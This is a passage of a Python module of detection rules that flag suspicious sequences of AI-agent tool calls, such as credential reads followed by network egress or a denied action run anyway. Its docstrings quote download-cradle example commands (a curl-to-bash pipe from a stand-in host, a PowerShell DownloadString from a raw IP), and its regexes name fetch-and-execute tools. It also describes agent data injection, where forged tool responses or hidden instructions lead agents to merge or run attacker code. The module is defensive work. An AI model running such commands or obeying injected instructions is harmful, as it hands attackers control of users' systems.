"""Behavioral sequence rules.

Per-event MITRE tagging (core/audit/mitre.py) says *what* a single tool call is.
These rules say what a *sequence* of calls means — the signal an EDR/CASB can't
see because it never had the agent's intent or the session boundary.

Each rule is a pure function: ``list[event] (time-ordered) -> list[Detection]``.
Add a rule by writing a function and appending it to REGISTRY.
"""

from __future__ import annotations

import re
from datetime import datetime, timezone
from typing import Any

from .models import Detection

# A raw-IP URL and a download/execute verb in the same command is a classic
# malware download cradle. Legit tooling uses domains and package managers.
_RAW_IP_URL = re.compile(r"https?://((?:\d{1,3}\.){3}\d{1,3})")
# Loopback is not ingress. Fetching your own orchestrator's health endpoint is
# the most common command a developer runs while dogfooding this tool, and it
# produced a critical "download cradle" on a plain status check. Same reasoning
# as the egress exemption in core/audit/mitre.py; piping loopback content into
# a shell still fires via _PIPE_TO_SHELL below.
_LOOPBACK_IP = re.compile(r"^(?:127(?:\.\d{1,3}){3}|0\.0\.0\.0)$")
_DOWNLOAD_EXEC = re.compile(
    r"downloadstring|downloadfile|invoke-webrequest|\biwr\b|\bcurl\b|\bwget\b|"
    r"certutil|bitsadmin|invoke-expression|\biex\b",
    re.IGNORECASE,
)
_ENCODED_CMD = re.compile(r"-enc(odedcommand)?\b|frombase64string", re.IGNORECASE)

# --- safe accessors ----------------------------------------------------------
# Events are plain dicts read from JSONL; never assume a nested key exists.


def _mitre(event: dict[str, Any]) -> dict[str, Any]:
    tool = event.get("tool")
    if isinstance(tool, dict):
        mitre = tool.get("mitre")
        if isinstance(mitre, dict):
            return mitre
    return {}


def _tactic_id(event: dict[str, Any]) -> str:
    return str(_mitre(event).get("tactic_id") or "")


def _technique_id(event: dict[str, Any]) -> str:
    return str(_mitre(event).get("technique_id") or "")


def _actor_type(event: dict[str, Any]) -> str:
    initiator = event.get("initiator")
    return str(initiator.get("actor_type") or "") if isinstance(initiator, dict) else ""


def _action(event: dict[str, Any]) -> dict[str, Any]:
    action = event.get("action")
    return action if isinstance(action, dict) else {}


def _action_type(event: dict[str, Any]) -> str:
    return str(_action(event).get("type") or "")


def _outcome(event: dict[str, Any]) -> str:
    return str(_action(event).get("outcome") or "")


def _tool_qualified(event: dict[str, Any]) -> str:
    tool = event.get("tool")
    return str(tool.get("qualified") or "") if isinstance(tool, dict) else ""


def _command(event: dict[str, Any]) -> str:
    tool = event.get("tool")
    return str(tool.get("command") or "") if isinstance(tool, dict) else ""


def _input_hash(event: dict[str, Any]) -> str:
    tool = event.get("tool")
    return str(tool.get("input_hash") or "") if isinstance(tool, dict) else ""


def _event_id(event: dict[str, Any]) -> str:
    return str(event.get("event_id") or "")


def _ts(event: dict[str, Any]) -> str:
    return str(event.get("timestamp_utc") or "")


def _correlation_id(events: list[dict[str, Any]]) -> str:
    for event in events:
        cid = event.get("correlation_id")
        if cid:
            return str(cid)
    return ""


def _trigger(event: dict[str, Any]) -> str:
    initiator = event.get("initiator")
    return str(initiator.get("trigger") or "") if isinstance(initiator, dict) else ""


def _norm_tool(name: str) -> str:
    """Same folding core.audit.mitre uses, so `delete_file`/`Delete` agree."""
    return name.lower().replace("_", "").replace("-", "")


def _business_tz(name: str) -> timezone | Any:
    """Resolve the operator's timezone, falling back to UTC if unavailable."""
    if not name or name.upper() == "UTC":
        return timezone.utc
    try:
        from zoneinfo import ZoneInfo

        return ZoneInfo(name)
    except Exception:
        return timezone.utc


def _business_window(spec: str) -> tuple[int, int]:
    """Parse "09-18" into (9, 18). Falls back to 09-18 on anything unparsable."""
    try:
        start_s, end_s = spec.split("-", 1)
        start, end = int(start_s), int(end_s)
        if 0 <= start < end <= 24:
            return start, end
    except (ValueError, AttributeError):
        pass
    return 9, 18


def _to_tz(ts: str, tz: Any) -> datetime | None:
    """Parse a canonical timestamp and convert it into `tz`.

    Explicit conversion is the whole point: reading `.hour` off the parsed value
    reports the *source* offset, not the operator's clock.
    """
    if not ts:
        return None
    try:
        dt = datetime.fromisoformat(ts.replace("Z", "+00:00"))
    except ValueError:
        return None
    if dt.tzinfo is None:
        dt = dt.replace(tzinfo=timezone.utc)  # canonical events are UTC
    return dt.astimezone(tz)


# --- rules -------------------------------------------------------------------

_DISCOVERY_BURST = 3  # list_dir/glob calls that read as recon before a grab
_DELETE_BURST = 5  # deletions in one session before it is worth a look
_SUBAGENT_BURST = 5  # subagent spawns in one session (Kimi AgentSwarm, Qwen Agent Teams)
_TOOL_BURST = 40  # successful tool calls in one session (HF-style agentic campaigns)
_HOST_SUBAGENT_BURST = 8  # subagent starts across sessions on one host

# Exact tool methods that destroy data. Normalized via _norm_tool, so
# `delete_file`, `deleteFile` and `Delete` all land here, while
# `remove_whitespace` and `undelete` correctly do not.
_DELETE_METHODS = frozenset(
    {"delete", "deletefile", "removefile", "rm", "rmdir", "unlink", "rmrf", "destroy"}
)

# `bash: rm -rf build/` is a deletion even though the tool is named "Bash".
_DELETE_COMMAND = re.compile(
    r"\brm\s+(-[a-z]*\s+)*|\brmdir\b|\bunlink\b|remove-item\b|\bdel\s+/", re.IGNORECASE
)

# Scheduled work runs at night by design; excluded from the off-hours rule.
_SCHEDULED_TRIGGERS = frozenset({"cron", "schedule", "scheduled", "timer"})

# Fetch remote content and feed it straight to an interpreter. The classic
# download cradle, and the payload shape in the ADI remote-code-execution chain
# (arXiv:2607.05120 §4.2). Deliberately independent of _RAW_IP_URL: a real
# attacker uses a domain, which reads as legitimate, so requiring a bare IP
# missed `curl https://evil-cdn.example.com/x.sh | bash` entirely.
_PIPE_TO_SHELL = re.compile(
    r"\b(curl|wget|iwr|invoke-webrequest|invoke-restmethod)\b[^|;&]*[|]\s*"
    r"(sudo\s+)?\b(ba|z|k|da)?sh\b|"
    r"\b(curl|wget|iwr|invoke-webrequest|invoke-restmethod)\b[^|;&]*[|]\s*"
    r"(iex|invoke-expression|python\d?|perl|ruby|node)\b",
    re.IGNORECASE,
)

# Tools/commands that pull content an outsider can author. ADI's whole premise
# is that this data is treated as trusted, so anything a session does *after*
# ingesting it deserves provenance.
_UNTRUSTED_INPUT_METHODS = frozenset(
    {"webfetch", "websearch", "readissue", "readprdesc", "readprcommit", "readcomments", "browse"}
)
# Note the absence of a bare `curl https://...`. A curl is ambiguous: this engine
# already models it as egress (TA0011), so counting it as ingestion too made it
# both halves of this rule, and two ordinary web reads raised an alarm. Only
# unambiguous content-ingestion vectors belong here.
_UNTRUSTED_INPUT_COMMAND = re.compile(
    r"\bgh\s+(issue|pr)\s+(view|list|diff|comment)|"
    r"\bgit\s+(fetch|pull|clone)\b",
    re.IGNORECASE,
)

# Techniques that make a post-ingestion action worth flagging. Plain execution
# is excluded on purpose: "read the issue, then run the tests" is the single
# most common agent workflow there is, and firing on it would bury the signal.
_RISKY_TACTICS = frozenset({"TA0006", "TA0011", "TA0010"})  # cred access, C2, exfil
_RISKY_TECHNIQUES = ("T1552", "T1485", "T1027", "T1105", "T1071")

# PR review: reading the description is not reading the code. ADI's supply-chain
# attack (§4.3) injects a fake tool response so the agent believes it reviewed a
# commit it never fetched.
_PR_DESC_METHODS = frozenset({"readprdesc", "readpr", "prview"})
_PR_COMMIT_METHODS = frozenset({"readprcommit", "prdiff", "readcommit", "prfiles"})
_PR_MERGE_METHODS = frozenset({"mergepr", "prmerge", "merge"})
_PR_DESC_COMMAND = re.compile(r"\bgh\s+pr\s+view\b", re.IGNORECASE)
_PR_COMMIT_COMMAND = re.compile(r"\bgh\s+pr\s+(diff|checkout|files)\b|\bgit\s+show\b", re.IGNORECASE)
_PR_MERGE_COMMAND = re.compile(r"\bgh\s+pr\s+merge\b|\bgit\s+merge\b", re.IGNORECASE)

# Cloud and cluster APIs used after credential harvest (HF July 2026 lateral phase).
# Require CLI invocation, not credential file paths like ~/.aws/credentials.
_CLOUD_API = re.compile(
    r"\bkubectl\b|"
    r"(?:^|\s)aws\s+\w|"
    r"\bgcloud\b|"
    r"\baz\s+(?:account|login|keyvault|aks|storage)\b|"
    r"\b(?:hf|huggingface-cli)\b|"
    r"\baliyun\b|\btencentcloud\b|\bbce\b|\bossutil\b|\bcoscmd\b",
    re.IGNORECASE,
)

# Push harvested material to a remote the operator did not intend (Nx s1ngularity class).
_GIT_EXFIL = re.compile(
    r"\bgit\s+push\b|"
    r"\bgh\s+repo\s+(?:create|sync)\b|"
    r"\bgh\s+release\s+upload\b",
    re.IGNORECASE,
)

# Public staging hosts used for agent C2 (gist, HF raw files, GitHub raw content).
_STAGING_HOST = re.compile(
    r"https?://(?:[\w-]+\.)?(?:"
    r"githubusercontent\.com|gist\.github\.com|raw\.github\.com|"
    r"huggingface\.co|pastebin\.com|gitlab\.com|bitbucket\.org"
    r")",
    re.IGNORECASE,
)
_STAGING_FETCH = re.compile(
    r"\b(curl|wget|iwr|invoke-webrequest|invoke-restmethod)\b",
    re.IGNORECASE,
)
# Second-step execution after a staged download — excludes package managers, which
# legitimately follow fetching a manifest from GitHub.
_RISKY_EXEC_AFTER_STAGING = re.compile(
    r"\b(bash|sh|zsh|dash)\s+[\w./~-]+\.(?:sh|bash)\b|"
    r"\bpython\d?\s+[\w./~-]+\.py\b|"
    r"\bpython\d?\s+-c\b|"
    r"\b(iex|invoke-expression|eval)\b|"
    r"\bpowershell(?:\.exe)?\s+-(?:enc|f|file)\b",
    re.IGNORECASE,
)
_BENIGN_AFTER_STAGING = re.compile(
    r"\b(npm|yarn|pnpm|pip|pip3|cargo|go)\s+(?:install|run|build)\b",
    re.IGNORECASE,
)


def _is_credential_access(event: dict[str, Any]) -> bool:
    return _technique_id(event).startswith("T1552")


def _is_staging_fetch(event: dict[str, Any]) -> bool:
    cmd = _command(event)
    if not cmd or not _STAGING_HOST.search(cmd):
        return False
    return bool(_STAGING_FETCH.search(cmd) or _DOWNLOAD_EXEC.search(cmd))


def _is_risky_exec_after_staging(event: dict[str, Any]) -> bool:
    if _action_type(event) != "tool_called" or _outcome(event) != "success":
        return False
    cmd = _command(event)
    if not cmd or _BENIGN_AFTER_STAGING.search(cmd):
        return False
    if _PIPE_TO_SHELL.search(cmd):
        return True
    return bool(_RISKY_EXEC_AFTER_STAGING.search(cmd))


def rule_credential_exfil(events: list[dict[str, Any]]) -> list[Detection]:
    """Credential access (T1552) then network egress (TA0011) in one session.

    The read-a-secret-then-phone-home pattern. Critical: this is exfiltration of
    exactly the data a SOC cares about, and no single event looks like an alert.
    """
    cred_idx = next(
        (i for i, e in enumerate(events) if _technique_id(e).startswith("T1552")),
        None,
    )
    if cred_idx is None:
        return []

    for net in events[cred_idx + 1:]:
        if _tactic_id(net) == "TA0011":
            cred = events[cred_idx]
            return [
                Detection(
                    rule_id="credential-exfil",
                    title="Credential access followed by network egress",
                    severity="critical",
                    summary=(
                        f"{_tool_qualified(cred) or 'a tool'} accessed credentials, then "
                        f"{_tool_qualified(net) or 'a tool'} egressed to the network in the "
                        "same session."
                    ),
                    correlation_id=_correlation_id(events),
                    tactic_ids=["TA0006", "TA0011"],
                    technique_ids=[_technique_id(cred), _technique_id(net)],
                    event_ids=[_event_id(cred), _event_id(net)],
                    first_seen_utc=_ts(cred),
                    last_seen_utc=_ts(net),
                )
            ]
    return []


def rule_autonomous_unapproved_write(events: list[dict[str, Any]]) -> list[Detection]:
    """Autonomous agent performs an Impact action with no human approval first.

    The flagship "no default self-approve" story: an agent running on its own
    (cron/vault_watch/ingress) wrote, edited, or deleted before any human
    approval_response landed in the session. A granted approval resets the gate.
    """
    offending: list[dict[str, Any]] = []
    approved = False
    for event in events:
        if _action_type(event) == "approval_response" and _outcome(event) == "success":
            approved = True
            continue
        if (
            not approved
            and _action_type(event) == "tool_called"
            and _outcome(event) == "success"
            and _tactic_id(event) == "TA0040"
            and _actor_type(event) == "autonomous"
        ):
            offending.append(event)

    if not offending:
        return []

    return [
        Detection(
            rule_id="autonomous-unapproved-write",
            title="Autonomous write without human approval",
            severity="high",
            summary=(
                f"{len(offending)} impact action(s) (write/edit/delete) by an autonomous "
                "agent with no human approval in the session."
            ),
            correlation_id=_correlation_id(events),
            tactic_ids=["TA0040"],
            technique_ids=sorted({_technique_id(e) for e in offending if _technique_id(e)}),
            event_ids=[_event_id(e) for e in offending],
            first_seen_utc=_ts(offending[0]),
            last_seen_utc=_ts(offending[-1]),
        )
    ]


def rule_discovery_then_collect(events: list[dict[str, Any]]) -> list[Detection]:
    """A burst of Discovery (TA0007) then Collection/Credential-Access — recon.

    Enumerating the filesystem and then reading files is the classic recon-then-
    grab shape. Medium: benign on its own, meaningful as a lead-in.
    """
    burst: list[dict[str, Any]] = []
    for event in events:
        tactic = _tactic_id(event)
        if tactic == "TA0007":
            burst.append(event)
        elif tactic in ("TA0009", "TA0006") and len(burst) >= _DISCOVERY_BURST:
            collect = event
            technique_ids = sorted({_technique_id(e) for e in burst if _technique_id(e)})
            if _technique_id(collect):
                technique_ids.append(_technique_id(collect))
            return [
                Detection(
                    rule_id="discovery-then-collect",
                    title="Filesystem recon followed by data collection",
                    severity="medium",
                    summary=(
                        f"{len(burst)} discovery calls preceded {_tool_qualified(collect) or 'a read'} "
                        "collecting data in the same session."
                    ),
                    correlation_id=_correlation_id(events),
                    tactic_ids=["TA0007", tactic],
                    technique_ids=technique_ids,
                    event_ids=[_event_id(e) for e in burst] + [_event_id(collect)],
                    first_seen_utc=_ts(burst[0]),
                    last_seen_utc=_ts(collect),
                )
            ]
    return []


def rule_approval_denied_then_executed(events: list[dict[str, Any]]) -> list[Detection]:
    """A human denied a gated action, and the exact same action executed successfully later.

    Two precision constraints, both learned from real dogfood trails:

    * Only explicit denials count. Ingest synthesizes `denied` approval
      responses for asks still pending at session_end (reason `inferred:...`).
      That is bookkeeping for a prompt nobody answered, not a human saying no,
      and treating it as a denial convicted every later call of the same tool —
      twelve criticals on one ordinary Cursor session.
    * The denial binds to the execution by the most specific identity both
      events share: input_hash, else the command string, else the qualified
      tool name. `shell.run` names every shell command there is, so a bare
      name match marked unrelated commands as guardrail bypasses.
    """
    denied: list[dict[str, Any]] = []
    detections: list[Detection] = []

    for event in events:
        action_type = _action_type(event)
        outcome = _outcome(event)

        if action_type == "approval_response" and outcome == "denied":
            if str(_action(event).get("reason") or "").startswith("inferred:"):
                continue
            tool_name = _tool_qualified(event)
            input_hash = _input_hash(event)
            gated = event.get("gated_action")
            if isinstance(gated, dict):
                tool_name = tool_name or str(gated.get("tool") or "")
                input_hash = input_hash or str(gated.get("input_hash") or "")
            if tool_name:
                denied.append(
                    {
                        "tool": tool_name,
                        "input_hash": input_hash,
                        "command": _command(event),
                        "event": event,
                    }
                )

        elif action_type == "tool_called" and outcome == "success":
            tool_name = _tool_qualified(event)
            if not tool_name:
                continue
            exec_hash = _input_hash(event)
            exec_cmd = _command(event)
            for i, entry in enumerate(denied):
                if entry["tool"] != tool_name:
                    continue
                if entry["input_hash"] and exec_hash:
                    if entry["input_hash"] != exec_hash:
                        continue
                elif entry["command"] and exec_cmd:
                    if entry["command"] != exec_cmd:
                        continue
                denial = entry["event"]
                detections.append(
                    Detection(
                        rule_id="approval-denied-then-executed",
                        title="Denied action was executed",
                        severity="critical",
                        summary=(
                            f"Tool '{tool_name}' was successfully executed after being explicitly "
                            "denied earlier in the session."
                        ),
                        correlation_id=_correlation_id(events),
                        tactic_ids=["TA0005"],
                        technique_ids=[],
                        event_ids=[_event_id(denial), _event_id(event)],
                        first_seen_utc=_ts(denial),
                        last_seen_utc=_ts(event),
                    )
                )
                denied.pop(i)
                break

    return detections


def rule_encoded_command_download(events: list[dict[str, Any]]) -> list[Detection]:
    """A command pulls a payload from a raw IP, often via an obfuscated one-liner.

    `powershell -EncodedCommand ...` or `IEX (New-Object Net.WebClient).
    DownloadString('http://185.220.101.5/a.ps1')` is a textbook download cradle:
    fetch and execute code from a bare IP address, no domain, no package manager.
    Critical, and it fires on a single event because the command itself is the
    tell.
    """
    for event in events:
        cmd = _command(event)
        if not cmd:
            continue
        remote_ips = [ip for ip in _RAW_IP_URL.findall(cmd) if not _LOOPBACK_IP.match(ip)]
        raw_ip_fetch = bool(remote_ips and _DOWNLOAD_EXEC.search(cmd))
        # Piping a fetch into an interpreter is a cradle whatever the host is.
        # Requiring a bare IP let `curl https://evil-cdn.example.com/x.sh | bash`
        # straight through, which is what a real attacker actually uses.
        piped = bool(_PIPE_TO_SHELL.search(cmd))
        if raw_ip_fetch or piped:
            encoded = bool(_ENCODED_CMD.search(cmd))
            techniques = ["T1105", "T1059.001"]  # Ingress Tool Transfer, PowerShell
            if encoded:
                techniques.append("T1027")  # Obfuscated Files or Information
            # Say which thing was actually seen. The rule fires on two distinct
            # shapes now, and reporting "a raw IP" for a domain-hosted cradle
            # would be a false statement in the detection itself.
            how = (
                "piped remote content straight into an interpreter"
                if piped
                else "fetched and executed content from a raw IP address"
            )
            return [
                Detection(
                    rule_id="encoded-command-download",
                    title="Remote code fetched and executed",
                    severity="critical",
                    summary=(
                        f"{_tool_qualified(event) or 'A command'} {how}"
                        + (" via an encoded command" if encoded else "")
                        + ". A classic download cradle."
                    ),
                    correlation_id=_correlation_id(events),
                    tactic_ids=["TA0011", "TA0002"],
                    technique_ids=techniques,
                    event_ids=[_event_id(event)],
                    first_seen_utc=_ts(event),
                    last_seen_utc=_ts(event),
                )
            ]
    return []


def _is_delete(event: dict[str, Any]) -> bool:
    """Is this event actually a destruction of data?

    Deliberately NOT a substring test. `"delete" in tool or "remove" in tool`
    matched `editor.remove_whitespace`, `remove_import` and `undelete`, so an
    ordinary refactor produced a *critical* "data destruction attack". Same
    class of bug as the loose tool matching fixed in core/audit/mitre.py.

    Authority order: the ATT&CK technique first (mitre.py already normalizes
    tool spellings), then an exact match on known destructive verbs, then the
    command text, so `bash: rm -rf build/` counts even though the tool is
    "Bash".
    """
    if _technique_id(event) in ("T1485", "T1070.004"):
        return True
    method = _norm_tool(_tool_qualified(event).rsplit(".", 1)[-1])
    if method in _DELETE_METHODS:
        return True
    return bool(_DELETE_COMMAND.search(_command(event)))


def rule_destructive_delete_burst(events: list[dict[str, Any]]) -> list[Detection]:
    """A burst of deletions in one session.

    High rather than critical: an agent cleaning build artifacts looks identical
    to an agent destroying data, and only the operator knows which. Critical is
    reserved for patterns that are hard to explain innocently (credential exfil,
    a denied action running anyway).
    """
    deletes = [
        e
        for e in events
        if _action_type(e) == "tool_called" and _outcome(e) == "success" and _is_delete(e)
    ]
    if len(deletes) < _DELETE_BURST:
        return []
    return [
        Detection(
            rule_id="destructive-delete-burst",
            title="Burst of destructive deletions",
            severity="high",
            summary=(
                f"{len(deletes)} deletion operations in a single session. Worth confirming "
                "this was intended cleanup and not data destruction."
            ),
            correlation_id=_correlation_id(events),
            tactic_ids=["TA0040"],
            technique_ids=sorted({_technique_id(e) for e in deletes if _technique_id(e)}),
            event_ids=[_event_id(e) for e in deletes],
            first_seen_utc=_ts(deletes[0]),
            last_seen_utc=_ts(deletes[-1]),
        )
    ]


def rule_off_hours_activity(events: list[dict[str, Any]]) -> list[Detection]:
    """An autonomous agent performs an impact action outside business hours.

    Opt-in (`AGENTMETRY_DETECT_OFF_HOURS=1`) and off by default, because as a
    generic rule this is mostly noise:

    * Scheduled jobs run at night. That is what cron is for. Flagging a nightly
      archive as "highly suspicious" trains operators to ignore the feed, so
      `trigger: cron` is excluded outright.
    * "Business hours" are local, not UTC. 23:00-05:00 UTC is early evening in
      the US. The window and timezone are therefore operator-configured
      (`AGENTMETRY_BUSINESS_HOURS`, `AGENTMETRY_BUSINESS_TZ`), not assumed.

    Timezone handling matters here: the previous version read `dt.hour` straight
    off the parsed timestamp, so an event stamped `02:00+09:00` (17:00 UTC, a
    Tuesday afternoon) was reported as off-hours "Hour: 2 UTC". Timestamps are
    converted explicitly before comparing.
    """
    from core.config import settings

    if not settings.detect_off_hours:
        return []

    tz = _business_tz(settings.business_tz)
    start_h, end_h = _business_window(settings.business_hours)

    for event in events:
        if _actor_type(event) != "autonomous":
            continue
        # A scheduled job running at 03:00 is doing its job, not hiding.
        if _trigger(event) in _SCHEDULED_TRIGGERS:
            continue
        if _tactic_id(event) != "TA0040" or _outcome(event) != "success":
            continue

        local = _to_tz(_ts(event), tz)
        if local is None:
            continue

        weekend = local.weekday() >= 5
        outside = not (start_h <= local.hour < end_h)
        if not (weekend or outside):
            continue

        when = "the weekend" if weekend else f"{local.hour:02d}:00 local"
        return [
            Detection(
                rule_id="off-hours-activity",
                title="Autonomous impact action outside business hours",
                severity="medium",
                summary=(
                    f"An unscheduled autonomous agent modified or deleted data on {when} "
                    f"({local.tzname()}), outside the configured "
                    f"{start_h:02d}:00-{end_h:02d}:00 window."
                ),
                correlation_id=_correlation_id(events),
                tactic_ids=[_tactic_id(event)],
                technique_ids=[_technique_id(event)] if _technique_id(event) else [],
                event_ids=[_event_id(event)],
                first_seen_utc=_ts(event),
                last_seen_utc=_ts(event),
            )
        ]
    return []


def _method(event: dict[str, Any]) -> str:
    return _norm_tool(_tool_qualified(event).rsplit(".", 1)[-1])


def _is_untrusted_input(event: dict[str, Any]) -> bool:
    """Did this event pull content an outsider could have authored?"""
    if _method(event) in _UNTRUSTED_INPUT_METHODS:
        return True
    return bool(_UNTRUSTED_INPUT_COMMAND.search(_command(event)))


def _is_risky(event: dict[str, Any]) -> bool:
    if _tactic_id(event) in _RISKY_TACTICS:
        return True
    technique = _technique_id(event)
    return any(technique.startswith(t) for t in _RISKY_TECHNIQUES)


def rule_untrusted_input_then_risky_action(events: list[dict[str, Any]]) -> list[Detection]:
    """A session ingested attacker-authorable data, then did something dangerous.

    Agent Data Injection (arXiv:2607.05120): an attacker hides malicious data
    inside content the agent already trusts, such as a GitHub issue comment
    carrying forged author metadata. The agent then acts on it. The paper's
    remote-code-execution chain is exactly `gh issue view` followed by executing
    a command the attacker supplied.

    This rule adds *provenance*, which no other rule here has: it says the risky
    action happened in a session that had already swallowed attacker-controllable
    content. That matters because the paper shows every prevention defense fails
    on ADI, including alignment guardrails, since the agent is still doing the
    task the user asked for. Only the data it acted on was corrupted, so the
    behaviour is the only evidence left.

    Plain execution after ingestion is deliberately NOT flagged: "read the issue,
    then run the tests" is the most common agent workflow there is. Only an
    already-risky technique (credential access, egress, destruction, obfuscated
    download) qualifies.
    """
    ingest_idx = next((i for i, e in enumerate(events) if _is_untrusted_input(e)), None)
    if ingest_idx is None:
        return []

    for event in events[ingest_idx + 1:]:
        if _action_type(event) != "tool_called" or _outcome(event) != "success":
            continue
        # Reading more untrusted content is not an escalation. Without this,
        # two consecutive web reads flagged each other.
        if _is_untrusted_input(event):
            continue
        if not _is_risky(event):
            continue
        source = events[ingest_idx]
        return [
            Detection(
                rule_id="untrusted-input-then-risky-action",
                title="Risky action after ingesting untrusted content",
                severity="high",
                summary=(
                    f"{_tool_qualified(source) or 'A tool'} pulled externally-authored content, "
                    f"then {_tool_qualified(event) or 'a tool'} performed a "
                    f"{_technique_id(event) or 'risky'} action in the same session. "
                    "Agent data injection hides instructions in data the agent trusts."
                ),
                correlation_id=_correlation_id(events),
                tactic_ids=[t for t in (_tactic_id(source), _tactic_id(event)) if t],
                technique_ids=[t for t in (_technique_id(source), _technique_id(event)) if t],
                event_ids=[_event_id(source), _event_id(event)],
                first_seen_utc=_ts(source),
                last_seen_utc=_ts(event),
            )
        ]
    return []


def rule_pr_merged_without_review(events: list[dict[str, Any]]) -> list[Detection]:
    """A pull request was merged without the agent ever fetching the code.

    Agent Data Injection (arXiv:2607.05120 §4.3): an attacker crafts a PR whose
    description contains a forged tool call and response, so the agent believes
    it already reviewed a commit it never read, and merges. The tell is an
    absence: a merge with no preceding fetch of the diff.

    Worth flagging even without ADI. An agent that merges code it never looked at
    is a supply-chain risk on its own.
    """
    reviewed = False
    saw_pr = False
    for event in events:
        if _action_type(event) != "tool_called":
            continue
        method, cmd = _method(event), _command(event)

        if method in _PR_DESC_METHODS or _PR_DESC_COMMAND.search(cmd):
            saw_pr = True
        if method in _PR_COMMIT_METHODS or _PR_COMMIT_COMMAND.search(cmd):
            reviewed = True
            continue

        merging = method in _PR_MERGE_METHODS or _PR_MERGE_COMMAND.search(cmd)
        if merging and saw_pr and not reviewed and _outcome(event) == "success":
            return [
                Detection(
                    rule_id="pr-merged-without-review",
                    title="Pull request merged without reading the code",
                    severity="critical",
                    summary=(
                        "The agent merged a pull request without ever fetching its diff. "
                        "A forged tool response can convince an agent it reviewed code it "
                        "never read."
                    ),
                    correlation_id=_correlation_id(events),
                    tactic_ids=["TA0001"],  # Initial Access via supply chain
                    technique_ids=["T1195.002"],  # Compromise Software Supply Chain
                    event_ids=[_event_id(event)],
                    first_seen_utc=_ts(event),
                    last_seen_utc=_ts(event),
                )
            ]
    return []


def rule_credential_read_then_cloud_api(events: list[dict[str, Any]]) -> list[Detection]:
    """Credential access (T1552) then a cloud or cluster API in the same session.

    Hugging Face's July 2026 agentic intrusion harvested cloud and cluster
    credentials, then used them to move laterally. The read alone is collection;
    the cloud CLI call is the escalation worth paging on.
    """
    cred_idx = next((i for i, e in enumerate(events) if _is_credential_access(e)), None)
    if cred_idx is None:
        return []

    for event in events[cred_idx + 1:]:
        if _action_type(event) != "tool_called" or _outcome(event) != "success":
            continue
        if not _CLOUD_API.search(_command(event)):
            continue
        cred = events[cred_idx]
        return [
            Detection(
                rule_id="credential-read-then-cloud-api",
                title="Credential access followed by cloud or cluster API",
                severity="critical",
                summary=(
                    f"{_tool_qualified(cred) or 'A tool'} accessed credentials, then "
                    f"{_tool_qualified(event) or 'a tool'} invoked a cloud or cluster "
                    "API (kubectl, aws, gcloud, az, or Hugging Face CLI) in the same "
                    "session."
                ),
                correlation_id=_correlation_id(events),
                tactic_ids=["TA0006", "TA0008"],
                technique_ids=[_technique_id(cred), "T1078"],
                event_ids=[_event_id(cred), _event_id(event)],
                first_seen_utc=_ts(cred),
                last_seen_utc=_ts(event),
            )
        ]
    return []


def rule_dotfile_read_then_git_push(events: list[dict[str, Any]]) -> list[Detection]:
    """Credential read (T1552) then push to a remote repository.

    Matches the exfil pattern seen in supply-chain campaigns: harvest secrets
    locally, then publish them via the victim's own git credentials.
    """
    cred_idx = next((i for i, e in enumerate(events) if _is_credential_access(e)), None)
    if cred_idx is None:
        return []

    for event in events[cred_idx + 1:]:
        if _action_type(event) != "tool_called" or _outcome(event) != "success":
            continue
        if not _GIT_EXFIL.search(_command(event)):
            continue
        cred = events[cred_idx]
        return [
            Detection(
                rule_id="dotfile-read-then-git-push",
                title="Credential read followed by git push",
                severity="critical",
                summary=(
                    f"{_tool_qualified(cred) or 'A tool'} accessed credentials, then "
                    f"{_tool_qualified(event) or 'a tool'} pushed to a remote repository "
                    "in the same session."
                ),
                correlation_id=_correlation_id(events),
                tactic_ids=["TA0006", "TA0010"],
                technique_ids=[_technique_id(cred), "T1567.001"],
                event_ids=[_event_id(cred), _event_id(event)],
                first_seen_utc=_ts(cred),
                last_seen_utc=_ts(event),
            )
        ]
    return []


def rule_remote_staging_then_execute(events: list[dict[str, Any]]) -> list[Detection]:
    """Fetch from a public staging host, then execute in a separate step.

    Agent C2 in the HF July 2026 disclosure staged payloads on public services.
    A one-liner `curl … | bash` is already caught by encoded-command-download;
    this rule covers the two-step variant: download to disk, then run.
    """
    fetch_idx = next((i for i, e in enumerate(events) if _is_staging_fetch(e)), None)
    if fetch_idx is None:
        return []

    for event in events[fetch_idx + 1:]:
        if _is_staging_fetch(event):
            continue
        if not _is_risky_exec_after_staging(event):
            continue
        source = events[fetch_idx]
        return [
            Detection(
                rule_id="remote-staging-then-execute",
                title="Staged download from public host followed by execution",
                severity="critical",
                summary=(
                    f"{_tool_qualified(source) or 'A tool'} fetched content from a "
                    "public staging host (GitHub raw, gist, Hugging Face, etc.), then "
                    f"{_tool_qualified(event) or 'a tool'} executed code in the same "
                    "session."
                ),
                correlation_id=_correlation_id(events),
                tactic_ids=["TA0011", "TA0002"],
                technique_ids=["T1105", "T1059"],
                event_ids=[_event_id(source), _event_id(event)],
                first_seen_utc=_ts(source),
                last_seen_utc=_ts(event),
            )
        ]
    return []


def _is_subagent_start(event: dict[str, Any]) -> bool:
    if _action_type(event) != "tool_called" or _outcome(event) != "success":
        return False
    reason = str(_action(event).get("reason") or "")
    if reason.startswith("subagent_start:"):
        return True
    return ".subagent." in _tool_qualified(event).lower()


def rule_subagent_swarm_burst(events: list[dict[str, Any]]) -> list[Detection]:
    """Many subagent spawns in one session.

    Kimi AgentSwarm and Qwen Agent Teams fan work out to isolated subagents.
    A burst can indicate autonomous swarm behaviour similar to the HF July 2026
    disclosure (many short-lived workers in one campaign).
    """
    starts = [e for e in events if _is_subagent_start(e)]
    if len(starts) < _SUBAGENT_BURST:
        return []
    return [
        Detection(
            rule_id="subagent-swarm-burst",
            title="Burst of subagent spawns in one session",
            severity="high",
            summary=(
                f"{len(starts)} subagent starts in a single session. Common in "
                "AgentSwarm / Agent Teams; worth confirming this was intended "
                "parallel work and not an autonomous attack swarm."
            ),
            correlation_id=_correlation_id(events),
            tactic_ids=["TA0002"],
            technique_ids=["T1059"],
            event_ids=[_event_id(e) for e in starts],
            first_seen_utc=_ts(starts[0]),
            last_seen_utc=_ts(starts[-1]),
        )
    ]


def rule_session_tool_burst(events: list[dict[str, Any]]) -> list[Detection]:
    """Many successful tool calls in one session.

    Autonomous agent campaigns (HF July 2026, Kimi AgentSwarm) often fan out
    dozens of tool invocations in a single correlation window. Normal interactive
    coding rarely exceeds a handful per minute — a burst is worth confirming.
    """
    tools = [
        e
        for e in events
        if _action_type(e) == "tool_called" and _outcome(e) == "success"
    ]
    if len(tools) < _TOOL_BURST:
        return []
    return [
        Detection(
            rule_id="session-tool-burst",
            title="Burst of tool calls in one session",
            severity="high",
            summary=(
                f"{len(tools)} successful tool calls in a single session. Common in "
                "autonomous agent campaigns; confirm this was intended work."
            ),
